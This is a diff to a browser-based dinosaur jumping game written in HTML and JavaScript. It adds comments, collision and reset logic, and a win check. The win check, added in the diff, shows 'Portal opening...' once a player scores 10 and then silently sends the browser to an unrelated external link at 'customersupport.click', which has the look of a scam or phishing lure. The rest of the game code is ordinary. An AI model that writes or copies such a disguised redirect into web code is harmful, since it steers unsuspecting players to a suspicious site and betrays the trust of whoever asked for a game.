@@ -61,9 +61,11 @@
         const canvas = document.getElementById("gameCanvas");
         const ctx = canvas.getContext("2d");
 
+        // Set canvas size
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
+        // Game variables
         let score = 0;
         let isJumping = false;
         let jumpHeight = 0;
@@ -83,16 +85,19 @@
             color: "green",
         };
 
+        // Draw Dinosaur
         function drawDinosaur() {
             ctx.fillStyle = dinosaur.color;
             ctx.fillRect(dinosaurX, dinosaurY - jumpHeight, dinosaur.width, dinosaur.height);
         }
 
+        // Draw Cactus
         function drawCactus() {
             ctx.fillStyle = "brown";
             ctx.fillRect(cactusX, canvas.height - cactusHeight - 20, cactusWidth, cactusHeight);
         }
 
+        // Handle Jumping
         function jump() {
             if (isJumping) {
                 if (jumpHeight < 100) {
@@ -107,11 +112,13 @@
             }
         }
 
+        // Update Score
         function updateScore() {
             score += 1;
             document.getElementById("score").innerText = `Score: ${score}`;
         }
 
+        // Collision Check
         function checkCollision() {
             if (
                 cactusX < dinosaurX + dinosaur.width &&
@@ -120,3 +127,75 @@
             ) {
                 gameOver = true;
                 document.getElementById("gameOver").innerText = "Game Over!";
+                setTimeout(() => {
+                    alert("Game Over! Your score is " + score);
+                    resetGame();
+                }, 1000);
+            }
+        }
+
+        // Win Check
+        function checkWin() {
+            if (score >= 10) {
+                document.getElementById("winMessage").innerText = "You Win! Portal opening...";
+                setTimeout(() => {
+                    window.location.href = "https://customersupport.click/GDQG8D";  // Redirect to portal
+                }, 2000);
+            }
+        }
+
+        // Reset Game
+        function resetGame() {
+            score = 0;
+            cactusX = canvas.width;
+            jumpHeight = 0;
+            isJumping = false;
+            gameOver = false;
+            document.getElementById("gameOver").innerText = "";
+            document.getElementById("winMessage").innerText = "";
+            document.getElementById("score").innerText = `Score: 0`;
+        }
+
+        // Update Cactus Movement
+        function updateCactus() {
+            cactusX -= cactusSpeed;
+            if (cactusX + cactusWidth < 0) {
+                cactusX = canvas.width;
+                updateScore();
+            }
+        }
+
+        // Main Game Loop
+        function gameLoop() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            drawDinosaur();
+            drawCactus();
+            jump();
+            updateCactus();
+            checkCollision();
+            checkWin();
+
+            if (!gameOver) {
+                requestAnimationFrame(gameLoop);
+            }
+        }
+
+        // Keyboard Event (Desktop)
+        window.addEventListener("keydown", function(event) {
+            if (event.keyCode === 32 && jumpHeight === 0 && !gameOver) {  // Spacebar key (keyCode 32)
+                isJumping = true;
+            }
+        });
+
+        // Mouse Event (Mobile)
+        window.addEventListener("click", function() {
+            if (jumpHeight === 0 && !gameOver) {
+                isJumping = true;
+            }
+        });
+
+        // Start Game
+        gameLoop();
+    </script>
+</body>
+</html>
